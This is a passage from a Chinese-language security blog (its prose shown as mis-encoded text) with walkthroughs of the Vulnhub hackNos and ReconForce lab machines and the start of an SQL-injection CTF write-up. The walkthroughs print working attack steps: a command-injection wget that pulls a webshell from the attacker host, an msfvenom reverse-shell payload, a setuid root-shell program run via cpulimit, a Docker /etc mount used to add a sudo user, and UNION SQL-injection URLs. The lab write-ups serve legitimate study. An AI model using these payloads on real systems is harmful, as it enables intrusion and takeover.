<p>æœ‰Dockerï¼Œå¯èƒ½æ˜¯åˆ©ç”¨dockerææƒï¼Œç„¶åblackdevilç”¨æˆ·åœ¨dockerç»„é‡Œï¼Œè€Œä¸”ä»–è¿˜åœ¨sudoç»„ã€‚é‚£ä¹ˆå…³é”®å°±æ˜¯blackdevilç”¨æˆ·äº†ã€‚æ¥ä¸‹é‡Œå°±æ˜¯æƒ³åŠæ³•æœé›†blackdevilçš„ä¿¡æ¯ï¼Œæ‰¾åˆ°ä»–çš„å¯†ç ã€‚</p>
<p>å·¦ç¿»å³ç¿»åœ¨<code>/var/local/</code>ç›®å½•ä¸‹å‘ç°äº†åä¸º<code>database</code>çš„æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code>Expenses
Software Licenses,$2.78
Maintenance,$68.87
Mortgage Interest,$70.35
Advertising,$9.78
Phone,$406.80
Insurance,$9.04
Opss;fackespreadsheet</code></pre>
<p>ä»¥ä¸ºæ˜¯ä¸ªè´¹ç”¨è®°å½•ï¼Œä½†æ˜¯æœ€åä¸€è¡Œæœ‰ç‚¹å¥‡æ€ªï¼Œå»æœç´¢ä¸€ç•ªï¼Œå‘ç°åŸæ¥æ˜¯ç»“æœencodeçš„ã€‚</p>
<p>åœ¨<a href="http://www.spammimic.com/spreadsheet.php">è¯¥ç½‘ç«™</a>å¯ä»¥decodeã€‚</p>
<p>è¯¥ç½‘ç«™å¯¹äºspreadsheetåŠ å¯†çš„è§£é‡Šå¦‚ä¸‹ï¼š</p>
<pre><code>There are terrific tools (like PGP and GPG) for encrypting your mail. If somebody along the way looks at the mail they can&#39;t understand it. But they do know you are sending encrypted mail to your pal.

The answer: encode your message into something innocent looking.
Your messages will be safe and nobody will know they&#39;re encrypted!</code></pre>
<p>æ„æ€å°±æ˜¯åŠ å¯†é‚®ä»¶å†…å®¹ï¼Œä¿è¯é‚®ä»¶å®‰å…¨ã€‚</p>
<p>è§£ç åå†…å®¹ä¸ºï¼š<code>Security@x@</code>ï¼Œä¹Ÿå°±æ˜¯balckdevilç”¨æˆ·çš„å¯†ç ã€‚</p>
<h3 id="ææƒ-1"><a href="#ææƒ-1" class="headerlink" title="ææƒ"></a>ææƒ</h3><h3 id="æ–¹æ³•1-ç›´æ¥sudo"><a href="#æ–¹æ³•1-ç›´æ¥sudo" class="headerlink" title="æ–¹æ³•1:ç›´æ¥sudo"></a>æ–¹æ³•1:ç›´æ¥sudo</h3><pre><code class="shell">blackdevil@hacknos:/home$ sudo -l
[sudo] password for blackdevil:
Matching Defaults entries for blackdevil on hacknos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User blackdevil may run the following commands on hacknos:
    (ALL : ALL) ALL
blackdevil@hacknos:/home$ sudo cat /root/root.txt
########    #####     #####   ########         ########
##     ##  ##   ##   ##   ##     ##            ##     ##
##     ## ##     ## ##     ##    ##            ##     ##
########  ##     ## ##     ##    ##            ########
##   ##   ##     ## ##     ##    ##            ##   ##
##    ##   ##   ##   ##   ##     ##            ##    ##
##     ##   #####     #####      ##    ####### ##     ##


MD5-HASH: bae11ce4f67af91fa58576c1da2aad4b

Author: Rahul Gehlaut

Blog: www.hackNos.com

Linkedin: https://in.linkedin.com/in/rahulgehlaut</code></pre>
<h3 id="æ–¹æ³•2-Dockerææƒ"><a href="#æ–¹æ³•2-Dockerææƒ" class="headerlink" title="æ–¹æ³•2:Dockerææƒ"></a>æ–¹æ³•2:Dockerææƒ</h3><p>ä¸Šä¼ Dockeré•œåƒå’ŒDockerfile -&gt; æ„å»ºé•œåƒ -&gt; åˆ›å»ºdockeråŒæ—¶æŒ‚è½½etcç›®å½• -&gt; dockeråˆ›å»ºç”¨æˆ·åŠ å…¥sudoç»„ -&gt; é€€å‡ºdockeråˆ‡æ¢æ–°å»ºç”¨æˆ· -&gt; æ‹¥æœ‰sudoæƒé™</p>
<p>è¿‡ç¨‹åŒï¼š<code>http://lanvnal.com/2020/02/01/Vulnhubé¶æœºä¹‹ReconForce01/#dockerææƒ</code></p>
<h3 id="æ–¹æ³•3ï¼šåˆ©ç”¨cpulimitææƒ"><a href="#æ–¹æ³•3ï¼šåˆ©ç”¨cpulimitææƒ" class="headerlink" title="æ–¹æ³•3ï¼šåˆ©ç”¨cpulimitææƒ"></a>æ–¹æ³•3ï¼šåˆ©ç”¨cpulimitææƒ</h3><blockquote>
<p><a href="https://gtfobins.github.io/gtfobins/cpulimit/#sudo">https://gtfobins.github.io/gtfobins/cpulimit/#sudo</a></p>
</blockquote>
<p>www-dataç”¨æˆ·æ˜¯æ²¡sudoæƒé™çš„ã€‚å¯ä»¥åœ¨æœ¬åœ°ç¼–è¯‘ä¸€ä¸ªä»¥rootèº«ä»½è°ƒç”¨<code>/bin/bash</code>çš„Cç¨‹åºï¼Œç„¶åé…åˆcpulimitæ‰§è¡Œï¼Œè¾¾åˆ°ææƒçš„ç›®çš„ã€‚</p>
<p>cpulimitåˆ©ç”¨æ–¹æ³•ï¼š<a href="https://gtfobins.github.io/gtfobins/cpulimit/#sudo">https://gtfobins.github.io/gtfobins/cpulimit/#sudo</a></p>
<pre><code class="shell">sudo cpulimit -l 100 -f /bin/sh</code></pre>
<p>www-dataç”¨æˆ·æ²¡æ³•sudoæ‰§è¡Œè¯¥æŒ‡ä»¤ã€‚</p>
<p>åœ¨æœ¬æœºå°†ä¸‹é¢æºç ç¼–è¯‘ï¼Œä¸Šä¼ åˆ°é¶æœºä¸Šç»™777æƒé™ï¼Œç„¶åæ­é…cpulimitè¿è¡Œã€‚</p>
<pre><code class="c">#include&lt;stdio.h&gt;
#include&lt;unistd.h&gt;
#include&lt;sys/types.h&gt;

int main()
&#123;
  setuid(0);
  setgid(0);
  system(&quot;/bin/bash&quot;);
  return 0;
&#125;</code></pre>
<p>ç¼–è¯‘ï¼š</p>
<pre><code class="shell">âœ¦ âœ gcc exp.c -o exp
exp.c:9:3: warning: implicit declaration of function &#39;system&#39; is invalid in C99
      [-Wimplicit-function-declaration]
  system(&quot;/bin/bash&quot;);
  ^
1 warning generated.</code></pre>
<p>ä¸Šä¼ åchmodç„¶åå’Œcpulimitä¸€èµ·ç”¨ï¼š</p>
<pre><code>www-data@hacknos:/tmp$ chmod 777 exp2
chmod 777 exp2
www-data@hacknos:/tmp$ cpulimit -l 100 -f ./exp2
cpulimit -l 100 -f ./exp2
Process 6468 detected
root@hacknos:/tmp# whoami
whoami
root
root@hacknos:/tmp# cat /root/root.txt</code></pre>
<blockquote>
<p>è¿™é‡Œé‡åˆ°ä¸ªé—®é¢˜å°±æ˜¯MACä¸‹ç¼–è¯‘çš„ç¨‹åºåœ¨é¶æœºä¸Šä¼šæŠ¥é”™ï¼ŒUbuntuä¸‹ç¼–è¯‘çš„exp2å°±å¯ä»¥ä½¿ç”¨ã€‚</p>
</blockquote>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸ªé¶æœºæ¯”è¾ƒåé‡ä¿¡æ¯æœé›†ï¼ŒåŒæ—¶ç¬¬ä¸‰ç§ææƒæ–¹å¼æ¶¨å§¿åŠ¿äº†ã€‚</p>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhubé¶æœºä¹‹ReconForce01</title>
    <url>/2020/02/01/vulnhub-ba-ji-zhi-reconforce01/</url>
    <content><![CDATA[<h2 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h2><p><a href="https://www.vulnhub.com/entry/hacknos-reconforce,416/">hackNos: ReconForce</a></p>
<ul>
<li><strong>Name</strong>: hackNos: ReconForce</li>
<li><strong>Date release</strong>: 11 Jan 2020</li>
</ul>
<p>Difficulty: Easy to Intermediate</p>
<p>Flag: 2 Flag first user And the second root</p>
<p>Learning: Web Application | Enumeration | Privilege Escalation</p>
<blockquote>
<ul>
<li><strong><a href="https://drive.google.com/open?id=1kg7NJA4LmGfCFcwOl87kLJ5CXbP7fV7n">Download</a></strong> </li>
<li>**<a href="https://download.vulnhub.com/hacknos/ReconForce-01.ova">Download (Mirror)</a> **</li>
<li><strong>Download (<a href="https://download.vulnhub.com/hacknos/ReconForce-01.ova.torrent">Torrent</a>)</strong> (<a href="magnet:?xt=urn:btih:49D1999B4B152A43F1BC723229DCC23635477576&dn=ReconForce-01.ova&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969"> Magnet</a>)</li>
</ul>
</blockquote>
<p>ä½¿ç”¨VirtualBoxæ‰“å¼€å¹¶é…ç½®ç½‘ç»œæ¨¡å¼ä¸ºï¼šhost-only</p>
<h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>é€šè¿‡æœ¬æœºç½‘ç»œé…ç½®ç¡®å®šé¶æœºä½äºç½‘æ–­ï¼š<code>192.168.56.0/24</code></p>
<p>ä½¿ç”¨nmapæ‰«æï¼Œå‘ç°ä¸»æœºipã€‚</p>
<pre><code>nmap -sS -O -v 192.168.56.0/24

Nmap scan report for 192.168.56.103
Host is up (0.00069s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:02:41:02 (Oracle VirtualBox virtual NIC)</code></pre>
<p>æ‰«æç«¯å£ä¿¡æ¯ï¼š</p>
<pre><code>âœ nmap -sT -A 192.168.56.103
Starting Nmap 7.70 ( https://nmap.org ) at 2020-02-04 22:02 CST
Nmap scan report for 192.168.56.103
Host is up (0.016s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6f:96:94:65:72:80:08:93:23:90:20:bc:76:df:b8:ec (RSA)
|   256 6f:bb:49:1a:a9:b6:e5:00:84:19:a0:e4:2b:c4:57:c4 (ECDSA)
|_  256 ce:3d:94:05:f4:a6:82:c4:7f:3f:ba:37:1d:f6:23:b0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Recon_Web
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
<p>å¾—çŸ¥å¼€æ”¾21ï¼Œ22ï¼Œ80ç«¯å£ã€‚</p>
<p>80ç«¯å£æœ‰webæœåŠ¡ï¼ŒftpæœåŠ¡å…è®¸åŒ¿åè®¿é—®ã€‚</p>
<p><code>|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</code></p>
<blockquote>
<p>FTPçš„åŒ¿åç™»å½•ä¸€èˆ¬æœ‰ä¸‰ç§ï¼š<br>1ã€ ç”¨æˆ·åï¼šanonymous å¯†ç ï¼šEmailæˆ–è€…ä¸ºç©º<br>2ã€ ç”¨æˆ·åï¼šFTP å¯†ç ï¼šFTPæˆ–è€…ä¸ºç©º<br>3ã€ ç”¨æˆ·åï¼šUSER å¯†ç ï¼špass</p>
</blockquote>
<p>æ‹¿dirsearchæ‰«ä¸€ä¸‹ç½‘ç«™ç›®å½•ï¼Œç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code>Target: http://192.168.56.103
/css
/index.html
/5ecure            #éœ€è®¤è¯</code></pre>
<p>indexé¡µé¢æ¯”è¾ƒç®€æ´ï¼Œé™¤äº†é“¾æ¥åˆ°/5ecureç›®å½•åˆ°æŒ‰é’®å¤–å…¶ä»–é“¾æ¥å‡æŒ‡å‘å…¶ä»–ç«™ç‚¹ã€‚</p>
<h2 id="æ¼æ´æŒ–æ˜"><a href="#æ¼æ´æŒ–æ˜" class="headerlink" title="æ¼æ´æŒ–æ˜"></a>æ¼æ´æŒ–æ˜</h2><p>å°è¯•åŒ¿åç™»é™†ftpï¼Œä½†æ˜¯ftpç›®å½•ä¸‹ç©ºç©ºå¦‚ä¹Ÿï¼Œæ²¡å•¥æœ‰ç”¨çš„æ–‡ä»¶ã€‚</p>
<pre><code>âœ ftp 192.168.56.103
Connected to 192.168.56.103.
220 &quot;Secure@hackNos&quot;.
Name (192.168.56.103:lanvnal): Anonymous
331 Please specify the password.
Password:
230 Login successful.</code></pre>
<p>ftpè¿™è¾¹æ²¡å¾—åˆ°å•¥æœ‰ç”¨ä¿¡æ¯é‚£å°±å»çœ‹çœ‹webæœåŠ¡å§ã€‚</p>
<p><code>http://192.168.56.103/5ecure/</code>æœ‰ä¸ªåŸºç¡€è®¤è¯ï¼Œåº”è¯¥æ˜¯åˆ‡å…¥ç‚¹ã€‚</p>
<p>å°è¯•äº†å¸¸ç”¨å¼±å£ä»¤ï¼ŒhackNosï¼ŒReconForceï¼ŒSecureç­‰éƒ½æ²¡æœ‰æˆåŠŸã€‚</p>
<p>æ€»ä¸èƒ½çˆ†ç ´å§â€¦.åœ¨è¿™å¡äº†å¥½ä¹…ï¼Œå»ç¿»indexé“¾æ¥çš„åšå®¢ï¼Œå‘ç°äº†ä¸€ç¯‡WP,æä¾›äº†æ€è·¯ã€‚</p>
<blockquote>
<p>I go to ftp login and connecting with ftp username and ftp password and ls command to see target directory and the target directory is empty and we see the target ftp banner Security@hackNos</p>
</blockquote>
<p>ftpç™»é™†çš„banneræ˜¯åŸºç¡€è®¤è¯å¯†ç ï¼Œç”¨æˆ·ä¸ºadminã€‚<br>ä½†æ˜¯banneræ˜¯ï¼šSecure@hackNosï¼Œå¹¶ä¸èƒ½æˆåŠŸç™»é™†ï¼Œè¯•äº†åšå®¢ä¸­çš„Security@hackNoså°±æ­£ç¡®äº†ã€‚<br>ä¸çŸ¥é“æ˜¯é¶æœºé”™è¯¯è¿˜æ˜¯æˆ‘æ²¡getåˆ°ã€‚</p>
<p>ç™»é™†åï¼š<br>è¯¥é¡µé¢å¯ä»¥å®ç°pingåŠŸèƒ½å¹¶è¿”å›ç»“æœã€‚Fuzzåå‘ç°å­˜åœ¨è¿‡æ»¤ã€‚ä½¿ç”¨<code>ï½œ</code>è¿æ¥å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>å¯ä»¥æ‰§è¡Œå‘½ä»¤<br><code>aaaï½œpwd</code></p>
<p>å¯ä»¥å†™æ–‡ä»¶</p>
<p><code>aaa|echo test&gt;test</code></p>
<p>ä½†æ˜¯æœ‰è¿‡æ»¤ï¼Œæ²¡æ³•ç›´æ¥å†™shellã€‚</p>
<p>catå‘½ä»¤æŸ¥çœ‹out.phpä»£ç ï¼Œå‘ç°é»‘åå•è¿‡æ»¤</p>
<pre><code class="php">æœ‰è¿‡æ»¤ï¼š
    // Set blacklist
    $substitutions = array(
        &#39;&amp;&#39;  =&gt; &#39;&#39;,
        &#39;;&#39;  =&gt; &#39;&#39;,
        &#39;| &#39; =&gt; &#39;&#39;,
        &#39;-&#39;  =&gt; &#39;&#39;,
        &#39;$&#39;  =&gt; &#39;&#39;,
        &#39;(&#39;  =&gt; &#39;&#39;,
        &#39;)&#39;  =&gt; &#39;&#39;,
        &#39;`&#39;  =&gt; &#39;&#39;,
        &#39;||&#39; =&gt; &#39;&#39;,
    );</code></pre>
<p>å‘ç°wgetå‘½ä»¤å¯ç”¨ï¼Œé‚ä½¿ç”¨wgetä¸‹è½½shellåˆ°é¶æœºã€‚</p>
<pre><code>a|wget 192.168.56.1:3333/shell.php</code></pre>
<p>å› ä¸ºæœ‰è®¤è¯ï¼Œå°†shellç§»åŠ¨åˆ°ä¸Šçº§ç›®å½•ï¼Œä½¿ç”¨èšå‰‘è¿æ¥ã€‚</p>
<p>åœ¨/home/recon/user.txt  ä¸­å‘ç°ç¬¬ä¸€æšflag</p>
<pre><code>MD5HASH: bae11ce4f67af91fa58576c1da2aad4b</code></pre>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p><strong>å…ˆæœé›†ç³»ç»Ÿä¿¡æ¯</strong></p>
<pre><code>www-data:/var/www/recon) $ uname -a
Linux hacknos 5.3.0-24-generic #26-Ubuntu SMP Thu Nov 14 01:33:18 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</code></pre>
<p>ä¸é€‚ç”¨Ubuntuçš„å†…æ ¸æ¼æ´ææƒã€‚</p>
<p>ä¸ºäº†æ–¹ä¾¿åç»­ææƒæ“ä½œï¼Œä½¿ç”¨msfæ¥è·å–ç¨³å®šmeterpreter shellshellã€‚ä½¿ç”¨msfvenomç”Ÿæˆç³»ç»Ÿå¯¹åº”çš„meterpreter shellåé€šè¿‡èšå‰‘ä¸Šä¼ ï¼Œæ›´æ”¹æƒé™ï¼Œæœ¬åœ°è®¾ç½®ç›‘å¬åæ‰§è¡Œã€‚</p>
<pre><code>./msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=6666  -f elf -o /Users/lanvnal/Files/Vulnhub/ReconForce-01/shell.elf</code></pre>
<p>msfè®¾ç½®ç›‘å¬</p>
<pre><code>msf5 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp
payload =&gt; linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &gt; show options
msf5 exploit(multi/handler) &gt; set LHOST 192.168.56.1
LHOST =&gt; 192.168.56.1</code></pre>
<p>ä¸Šä¼ LinEnumæ¥æœé›†ä¿¡æ¯ã€‚è·å–åˆ°å¦‚ä¸‹æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚</p>
<pre><code>[-] Users that have previously logged onto the system:
Username         Port     From             Latest
recon            pts/0    192.168.0.104    Fri Jan 10 23:05:02 +0000 2020

[-] It looks like we have some admin users:
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm)
uid=1000(recon) gid=119(docker) groups=119(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd)

[+] Looks like we&#39;re hosting Docker:
Docker version 19.03.2, build 6a30dfca03</code></pre>
<p>é€šè¿‡æœé›†åˆ°çš„ä¿¡æ¯ï¼Œå¹¶æ²¡æœ‰å¯ä»¥ç”¨æ¥SUIDææƒçš„åˆé€‚åº”ç”¨ã€‚</p>
<p>å‘ç°äº†è¿‘æœŸç™»é™†ç”¨æˆ·reconï¼Œè€Œä¸”å±äºsudoç»„ã€‚åªè¦çŸ¥é“reconå¯†ç å°±æˆäº†ï½</p>
<p>å°è¯•ä¸‹æœ€å¼€å§‹çš„å¯†ç <code>Security@hackNos</code>ç»“æœç›´æ¥å°±åˆ‡æ¢åˆ°äº†<code>recon</code>ç”¨æˆ·ã€‚ã€‚ã€‚</p>
<p>è¯•äº†ä¸€ä¸‹ç”¨æˆ·reconå¯ä»¥sshç™»é™†ã€‚</p>
<h3 id="ç›´æ¥sudo"><a href="#ç›´æ¥sudo" class="headerlink" title="ç›´æ¥sudo"></a>ç›´æ¥sudo</h3><p>sudo suåˆ‡æ¢åˆ°rootç”¨æˆ·ã€‚è·å–flag</p>
<pre><code>root@hacknos:~# cat root.txt
     $$\          $$$$$$$\
     \$$\         $$  __$$\
$$$$\ \$$\        $$ |  $$ | $$$$$$\   $$$$$$$\  $$$$$$\  $$$$$$$\
\____| \$$\       $$$$$$$  |$$  __$$\ $$  _____|$$  __$$\ $$  __$$\
$$$$\  $$  |      $$  __$$&lt; $$$$$$$$ |$$ /      $$ /  $$ |$$ |  $$ |
\____|$$  /       $$ |  $$ |$$   ____|$$ |      $$ |  $$ |$$ |  $$ |
     $$  /        $$ |  $$ |\$$$$$$$\ \$$$$$$$\ \$$$$$$  |$$ |  $$ |
     \__/         \__|  \__| \_______| \_______| \______/ \__|  \__|




MD5HASH: bae11ce4f67af91fa58576c1da2aad4b

Author: Rahul Gehlaut

WebBlog: www.hackNos.com

Twitter: @rahul_gehlaut
</code></pre>
<h3 id="dockerææƒ"><a href="#dockerææƒ" class="headerlink" title="dockerææƒ"></a>dockerææƒ</h3><p>ä¸Šé¢è¿˜è¿è¡Œç€dockeræœåŠ¡ï¼Œå°è¯•ä½¿ç”¨dockerè¿›è¡Œææƒã€‚</p>
<p>ä¸Šä¼ é•œåƒå’Œdockerfileã€‚</p>
<p>æ„å»ºé•œåƒï¼š</p>
<pre><code>docker build -t alpine:3.11 .
Sending build context to Docker daemon  2.726MB
Step 1/3 : FROM scratch
 ---&gt;
Step 2/3 : ADD alpine-minirootfs-3.11.3-x86_64.tar.gz /
 ---&gt; 7e80960be23b
Step 3/3 : CMD [&quot;/bin/sh&quot;]
 ---&gt; Running in 4e1cfbba3f17
Removing intermediate container 4e1cfbba3f17
 ---&gt; dd3aa746c7fc
Successfully built dd3aa746c7fc
Successfully tagged alpine:3.11</code></pre>
<p>åˆ›å»ºdockerï¼ŒåŒæ—¶æŒ‚è½½ç›®å½•</p>
<pre><code>docker run -it --rm -v /etc:/etc alpine:3.11 /bin/sh</code></pre>
<pre><code>åˆ›å»ºç”¨æˆ·
adduser test
æ·»åŠ åˆ°sudoç»„
usermod -aG sudo test
æˆ–
adduser test sudo</code></pre>
<p>é€€å‡ºdockerï¼Œåˆ‡æ¢ç”¨æˆ·ï¼Œæ‰§è¡Œsudo.</p>
<pre><code>test@hacknos:/var/www/docker$ sudo su
[sudo] password for test:
\root@hacknos:/var/www/docker# ls /root
root.txt  snap</code></pre>
<blockquote>
<p>å‚è€ƒï¼š</p>
<p><a href="https://www.freebuf.com/articles/system/170783.html">https://www.freebuf.com/articles/system/170783.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>é¶æœº</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Writeup for sqlæ³¨å…¥é¶æœºæµ‹è¯•</title>
    <url>/2017/04/04/writeup/</url>
    <content><![CDATA[<h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="â€”For-sqlæ³¨å…¥é¶æœºæµ‹è¯•"><a href="#â€”For-sqlæ³¨å…¥é¶æœºæµ‹è¯•" class="headerlink" title="â€”For sqlæ³¨å…¥é¶æœºæµ‹è¯•"></a>â€”For sqlæ³¨å…¥é¶æœºæµ‹è¯•</h2><p>ä¸€äº›èµ„æ–™â€“&gt;1.<a href="http://www.jianshu.com/p/b562a0d03cbb">http://www.jianshu.com/p/b562a0d03cbb</a></p>
<p>â€‹            2.<a href="http://www.jianshu.com/p/ba35a7e1c67d">http://www.jianshu.com/p/ba35a7e1c67d</a></p>
<p>â€‹            3.<a href="http://blog.idhyt.com/2015/04/21/technic-sql-inject/">http://blog.idhyt.com/2015/04/21/technic-sql-inject/</a></p>
<h2 id="gt-gt-SQLæ³¨å…¥åˆ†ç±»"><a href="#gt-gt-SQLæ³¨å…¥åˆ†ç±»" class="headerlink" title="&gt;&gt;SQLæ³¨å…¥åˆ†ç±»"></a>&gt;&gt;SQLæ³¨å…¥åˆ†ç±»</h2><ul>
<li><p>UNION query SQL injectionï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰</p>
</li>
<li><p>Boolean-based blind SQL injectionï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰</p>
</li>
<li><p>Error-based SQL injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰</p>
</li>
<li><p>Stacked queries SQL injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰</p>
</li>
<li><p>Time-based blind SQL injectionï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰</p>
<a id="more"></a>

</li>
</ul>
<h2 id="gt-gt-SQLæ³¨å…¥åˆ©ç”¨æ‰‹æ³•"><a href="#gt-gt-SQLæ³¨å…¥åˆ©ç”¨æ‰‹æ³•" class="headerlink" title="&gt;&gt;SQLæ³¨å…¥åˆ©ç”¨æ‰‹æ³•"></a>&gt;&gt;SQLæ³¨å…¥åˆ©ç”¨æ‰‹æ³•</h2><h4 id="UNION-query-SQL-injectionï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰"><a href="#UNION-query-SQL-injectionï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰" class="headerlink" title="UNION query SQL injectionï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰"></a>UNION query SQL injectionï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰</h4><p>â€‹    è¦æ±‚ç½‘ç«™æ²¡æœ‰è¿‡æ»¤å…³é”®å­— æ²¡æœ‰è½¬ä¹‰ æœ‰æ˜¾ç¤ºä½</p>
<h4 id="Error-based-SQL-injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰"><a href="#Error-based-SQL-injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰" class="headerlink" title="Error-based SQL injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰"></a>Error-based SQL injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰</h4><p>â€‹    éœ€è¦è„šæœ¬è¾“å‡º sqlé”™è¯¯ä¿¡æ¯</p>
<h4 id="Boolean-based-blind-SQL-injectionï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰"><a href="#Boolean-based-blind-SQL-injectionï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰" class="headerlink" title="Boolean-based blind SQL injectionï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰"></a>Boolean-based blind SQL injectionï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰</h4><p>â€‹    å·¥ä½œé‡å¤§ éœ€è¦æ—¶é—´</p>
<h4 id="Stacked-queries-SQL-injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰"><a href="#Stacked-queries-SQL-injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰" class="headerlink" title="Stacked queries SQL injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰"></a>Stacked queries SQL injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰</h4><p>â€‹    æœ‰çš„æ•°æ®åº“ä¸æ”¯æŒ</p>
<h4 id="Time-based-blind-SQL-injectionï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰"><a href="#Time-based-blind-SQL-injectionï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰" class="headerlink" title="Time-based blind SQL injectionï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰"></a>Time-based blind SQL injectionï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰</h4><p>â€‹    å¯ä»¥åœ¨æ¡ä»¶å¾ˆè‹›åˆ»çš„æƒ…å†µä¸‹æ³¨å…¥ï¼ˆæ— æŠ¥é”™ï¼Œæ— æ˜¾ç¤ºä½ï¼‰ï¼Œä½†éå¸¸è´¹æ—¶é—´ã€‚</p>
<h2 id="sql-1-103-238-227-13-10083"><a href="#sql-1-103-238-227-13-10083" class="headerlink" title="sql-1(103.238.227.13:10083)"></a>sql-1(103.238.227.13:10083)</h2><pre><code>
1-http://103.238.227.13:10083/?id=-1%df&#39; UNION SELECT 1,database() --+
2-http://103.238.227.13:10083/?id=-1%df&#39; UNION SELECT 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+
3-http://103.238.227.13:10083/?id=-1%df&#39; UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=char(107,101,121) --+
4.http://103.238.227.13:10083/?id=-1%df&#39; UNION SELECT 1,group_concat(string) from .key group by id  --+</code></pre>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170402/013535527.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170402/013621013.png" alt="mark"></p>
<p><code>    id=1</code>ååŠ <code>â€˜</code>æ²¡æœ‰æŠ¥é”™ï¼Œåº”è¯¥æ˜¯åŠ äº†<code>\</code>å°†å…¶è½¬ä¹‰äº†ã€‚</p>
<p><strong>åˆ©ç”¨<a href="http://www.cnblogs.com/lcamry/articles/5625276.html">å®½å­—èŠ‚æ³¨å…¥</a></strong></p>
<blockquote>
<blockquote>
